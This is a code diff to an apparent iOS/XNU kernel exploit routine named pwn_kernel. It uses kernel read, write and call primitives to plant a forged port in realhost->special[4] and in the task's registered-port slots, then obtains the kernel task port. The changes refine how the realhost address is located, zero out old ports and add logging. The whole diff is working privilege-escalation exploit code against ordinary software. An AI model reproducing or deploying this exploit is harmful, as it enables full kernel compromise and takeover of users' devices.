@@ -634,7 +634,7 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     
     kmap_hdr_t zm_hdr = { 0 };
     
-    // lck_rw_t -> uintptr_t opaque[2] -> unsigned long opaque[2]
+    // lck_rw_t = uintptr_t opaque[2] = unsigned long opaque[2]
     kreadbuf(zone_map_addr + (sizeof(unsigned long) * 2), (void *)&zm_hdr, sizeof(zm_hdr));
     
     LOG("zmap start: %llx", zm_hdr.start);
@@ -774,23 +774,6 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     mach_port_destroy(mach_task_self(), maps[0]);
     mach_port_destroy(mach_task_self(), maps[1]);
     
-    uint64_t realhost = zonemap_fix_addr(kcall(offsets.funcs.host_priv_self, 0));
-    if (realhost == 0x0)
-    {
-        LOG("failed to get realhost");
-        ret = KERN_FAILURE;
-        goto out;
-    }
-    
-    // weird bug where realhost can sometimes be 0x200000000 too large
-    // TODO: fixme
-    if ((realhost & 0xf00000000) == 0x200000000)
-    {
-        realhost -= 0x200000000;
-    }
-    
-    LOG("[!] realhost: %llx", realhost);
-    
     // remap must cover one page
     uint64_t remap_start = remap_addr & ~(pgsize - 1);
     uint64_t remap_end = remap_start + pgsize;
@@ -810,16 +793,25 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     kcall(offsets.funcs.ipc_kobject_set, 3, new_port, remap_addr, IKOT_TASK);
     kcall(offsets.funcs.ipc_port_make_send, 1, new_port);
     
+    uint64_t realhost = offsets.data.realhost + kslide;
+    LOG("[!] realhost: %llx", realhost);
+    
     // realhost->special[4]
     kwrite64(realhost + 0x10 + (sizeof(uint64_t) * 4), new_port);
-    
+    LOG("registered realhost->special[4]");
+
+    // zero out old ports before overwriting
+    for (int i = 0; i < 3; i++)
+    {
+        kwrite64(curr_task + offsets.struct_offsets.itk_registered + (i * 0x8), 0x0);
+    }
+
     kwrite64(curr_task + offsets.struct_offsets.itk_registered, new_port);
-    LOG("wrote new port");
+    LOG("wrote new port: %llx", new_port);
     
-    usleep(500000);
+    // usleep(500000);
     
     ret = mach_ports_lookup(mach_task_self(), &maps, &maps_num);
-    LOG("got lookup port");
     
 //    kwrite64(curr_task + ITK_REGISTERED_OFFSET, 0x0);
 
@@ -829,8 +821,6 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
         ret = KERN_FAILURE;
         goto out;
     }
-
-    usleep(500000);
     
     mach_port_t kernel_task = maps[0];
     if (!MACH_PORT_VALID(kernel_task))
@@ -839,6 +829,7 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
         ret = KERN_FAILURE;
         goto out;
     }
+    LOG("got kernel task port: %x", kernel_task);
 
     // should be ready? pullup !
 
